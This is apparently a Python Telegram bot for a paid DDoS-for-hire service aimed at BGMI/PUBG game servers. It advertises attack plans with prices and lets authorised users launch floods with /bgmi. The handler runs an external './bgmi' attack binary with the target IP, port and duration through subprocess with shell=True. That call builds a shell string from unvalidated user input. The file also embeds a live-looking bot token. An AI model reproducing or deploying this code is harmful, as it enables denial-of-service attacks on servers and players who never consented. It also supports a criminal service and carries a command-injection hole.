#put your bot token and user id
# all admin command are change. so all modified cmd note on ur mind 😏


# CMD : 1) pip install telebot, 2) pip install flask 3) chmod +x * 4) python go.py
# dm : @HULK KI BAHA if you faces any issue

import telebot
import subprocess
import requests
import datetime
import os

from keep_alive import keep_alive
keep_alive()

# insert your Telegram bot token here
bot = telebot.TeleBot('7294163038:AAEVdzPClfRjqzQl0P59g1TqPZS1Hgu0-HE')

# Admin user IDs
admin_id = ["", "", "", "5394098911"]

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"

# File To Store Free / Start Users 

FREE_USER_FILE = "allm.txt"
# ____________________________________________________________________________________________S4_______________________________________________________________________________________________
# PUBG MOBILES CHAT BY HULK KI BAHAN
# TEAM S4 WARKING ON TIME OWNER - HULK KI BAHAN
# _____________________________________________________________________________________HULK KI BAHAN ________________________________________________________________

# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# Function to read free user IDs and their credits from the file
def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():  # Check if line is not empty
                    user_info = line.split()
                    if len(user_info) == 2:
                        user_id, credits = user_info
                        free_user_credits[user_id] = int(credits)
                    else:
                        print(f"Ignoring invalid line in free user file: {line}")
    except FileNotFoundError:
        pass


# List to store allowed user IDs
allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget : {target}\nPort : {port}\nTime : {time}\n\n�̶�̶ ̶ ̶FIGHTER OFFICIAL✌")


# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs are already cleared. No data found ❌."
            else:
                file.truncate(0) 
                response = "Logs cleared successfully ✅"
    except FileNotFoundError:
        response = "No logs found to clear."
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID : {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target : {target}"
    if port:
        log_entry += f" | Port : {port}"
    if time:
        log_entry += f" | Time : {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_add = command[1]
            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                response = f"User {user_to_add} Added Successfully 👍."
            else:
                response = "User already exists 🤦‍♂️."
        else:
            response = "Please specify a user ID to add 😒."
    else:
        response = "Only Admin Can Run This Command 😡."

    bot.reply_to(message, response)



@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"User {user_to_remove} removed successfully 👍."
            else:
                response = f"User {user_to_remove} not found in the list ❌."
        else:
            response = '''Please Specify A User ID to Remove. 
✅ Usage: /remove <userid>'''
    else:
        response = "Only Admin Can Run This Command 😡."

    bot.reply_to(message, response)


@bot.message_handler(commands=['clogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "Logs are already cleared. No data found ❌."
                else:
                    file.truncate(0)
                    response = "Logs Cleared Successfully ✅"
        except FileNotFoundError:
            response = "Logs are already cleared ❌."
    else:
        response = "Only Admin Can Run This Command 😡."
    bot.reply_to(message, response)

 

@bot.message_handler(commands=['allmem'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "No data found ❌"
        except FileNotFoundError:
            response = "No data found ❌"
    else:
        response = "Only Admin Can Run This Command 😡."
    bot.reply_to(message, response)


@bot.message_handler(commands=['check'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "No data found ❌."
                bot.reply_to(message, response)
        else:
            response = "❌"
            bot.reply_to(message, response)
    else:
        response = "❌"
        bot.reply_to(message, response)


@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"Your User ID : {user_id}"
    bot.reply_to(message, response)

# Function to handle the reply when free users run the /bgmi command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    user_name = message.from_user.first_name
    username = user_info.username if user_info.username else user_info.first_name
#____________________________________________________________________________________________S4_______________________________________________________________________________________________
# PUBG MOBILES CHAT BY HULK KI BAHAN
# TEAM S4 WARKING ON TIME OWNER - HULK KI BAHAN
# _____________________________________________________________________________________HULK KI BAHAN ________________________________________________________________
    
    response = f"\n☔ 𝐉𝐀𝐈 𝐁𝐇𝐀𝐑𝐀𝐓 ☔\n🌴 🌴 𝙎𝘼𝙑𝙀 𝙏𝙍𝙀𝙀🌲 🌲\n😜 𝐀𝐓. 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 😜"
    bot.reply_to(message, response)

# Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}

COOLDOWN_TIME =0

# Handler for /bgmi command
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 7:
                response = "𓂀 ℝ𝔼𝕃𝕆𝔸𝔻 𝕋𝕀𝕄𝔼 𓂀\n\n 🌹 FIGHTER ๏η Ŧσ𝕡 🌹 "
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # Convert time to integer
            time = int(command[3])  # Convert port to integer
            if time > 240:
                response = "𝐌𝐔𝐓𝐇𝐀𝐋 𝐓𝐈𝐌𝐄 𝐉𝐘𝐀𝐃𝐀 𝐇𝐎 𝐆𝐘𝐀 𝐊𝐔𝐂𝐇😁"
            elif time < 240:
                response = "𝐌𝐔𝐓𝐇𝐀𝐋 𝐓𝐈𝐌𝐄 𝐉𝐘𝐀𝐃𝐀 𝐇𝐎 𝐆𝐘𝐀 𝐊𝐔𝐂𝐇😁"
            else:
                record_command_logs(user_id, '/bgmi', target, port, time) #cmd change kr lena 😁 [ line : 251 and 256
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                full_command = f"./bgmi {target} {port} {time} 600"
                subprocess.run(full_command, shell=True)
                response = f"𝕒ŦＴ𝓪ℂｋ Ŧιℕｉ𝐒卄є𝐃 ♧\n\n🐸♢  Ｎ𝓸Ⓔ 𝕤𝔸ℕ𝓓  🐻♙\n\n🌴 🌴 𝙎𝘼𝙑𝙀 𝙏𝙍𝙀𝙀🌲 🌲"
        else:
            response = "✅𝐑𝐄𝐀𝐃𝐘 𝐓𝐎 𝐋𝐎𝐍𝐂𝐇✅\n\n🌴 🌴 𝙎𝘼𝙑𝙀 𝙏𝙍𝙀𝙀🌲 🌲\n\n/𝐛𝐠𝐦𝐢_𝐢𝐩_𝐩𝐨𝐫𝐭_𝐭𝐢𝐦𝐞=𝟐𝟒𝟎"  # Updated command syntax
    else:
        response = "❌𝙔𝙤𝙪 𝘼𝙧𝙚 𝙉𝙤𝙩 𝘼𝙪𝙩𝙝𝙤𝙧𝙞𝙯𝙚𝙙 𝙏𝙤 𝙐𝙨𝙚 𝙏𝙝𝙞𝙨 𝘾𝙤𝙢𝙢𝙖𝙣𝙙❌."

    bot.reply_to(message, response)



# Add /mylogs command to display logs recorded for bgmi and website commands
@bot.message_handler(commands=['mylo'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Your Command Logs:\n" + "".join(user_logs)
                else:
                    response = "❌ No Command Logs Found For You ❌."
        except FileNotFoundError:
            response = "No command logs found."
    else:
        response = "𝙔𝙤𝙪 𝘼𝙧𝙚 𝙉𝙤𝙩 𝘼𝙪𝙩𝙝𝙤𝙧𝙞𝙯𝙚𝙙 𝙏𝙤 𝙐𝙨𝙚 𝙏𝙝𝙞𝙨 𝘾𝙤𝙢𝙢𝙖𝙣𝙙 😡."

    bot.reply_to(message, response)


@bot.message_handler(commands=['help'])
def show_help(message):
    help_text ='''Available commands :
💥 /𝙗𝙜𝙢𝙞 : 𝙈𝙚𝙩𝙝𝙤𝙙 𝙁𝙤𝙧 𝘽𝙜𝙢𝙞 𝙎𝙚𝙧𝙫𝙚𝙧𝙨

'''
    for handler in bot.message_handlers:
        if hasattr(handler, 'commands'):
            if message.text.startswith('/help'):
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
            elif handler.doc and 'admin' in handler.doc.lower():
                continue
            else:
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'''𝙒𝙀𝙇𝘾𝙊𝙈𝙀 𝙏𝙊 FIGHTER 𝙁𝘼𝙈𝙄𝙇𝙔\n
𝙎𝙀𝙍𝙑𝙀𝙍 𝘼𝙏𝙏𝘼𝘾𝙆 𝘽𝙔 ~ FIGHTER\n
𝙎𝙀𝙉𝘿 𝙔𝙊𝙐𝙍 𝘼𝙏𝙏𝘼𝘾𝙆 𝙇𝙄𝙆𝙀\n
/𝘽𝙂𝙈𝙄_𝙏𝘼𝙍𝙂𝙀𝙏 𝙄𝙋_𝙋𝙊𝙍𝙏_𝙏𝙄𝙈𝙀
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} Please Follow These Rules ⚠️: Check Group Pin Message All Of Them'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Brother Only 1 Plan Is Powerfull Then Any Other Ddos !!

V͎i͎p͎ 🌟 :
-> A͎t͎t͎a͎c͎k͎ T͎i͎m͎e͎ : 30͎0͎ (S͎)
-> A͎f͎t͎e͎r͎ A͎t͎t͎a͎c͎k͎ L͎i͎m͎i͎t͎ : 3͎ M͎i͎n͎
-> C͎o͎n͎c͎u͎r͎r͎e͎n͎t͎s͎ A͎t͎t͎a͎c͎k͎ : 3͎0͎0͎

𝐏𝐫𝐢𝐜𝐞 𝐋𝐢𝐬𝐭 💸 :
𝐃𝐚𝐲-> 𝟏2𝟎 𝐑𝐬
𝐖𝐞𝐞𝐤-> 𝟖𝟎𝟎 𝐑𝐬
𝐌𝐨𝐧𝐭𝐡-> 𝟏8𝟎𝟎 𝐑𝐬

𝐈𝐟 𝐘𝐨𝐮 𝐖𝐚𝐧𝐭 𝐓𝐨 𝐁𝐮𝐲 𝐏𝐫𝐢𝐯𝐚𝐭𝐞 𝐒𝐞𝐫𝐯𝐞𝐫 𝐂𝐨𝐧𝐭𝐚𝐜𝐭 𝐔𝐬.
@FIGHTER_OPVIP
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['amd'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Admin Commands Are Here!!:
'''
    bot.reply_to(message, response)


@bot.message_handler(commands=['bcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "Join - https://t.me/+OCfVMSxM2885MzFl\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
            response = "Broadcast Message Sent Successfully To All Users 👍."
        else:
            response = "🤖 Please Provide A Message To Broadcast."
    else:
        response = "Only Admin Can Run This Command 😡."

    bot.reply_to(message, response)



while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)

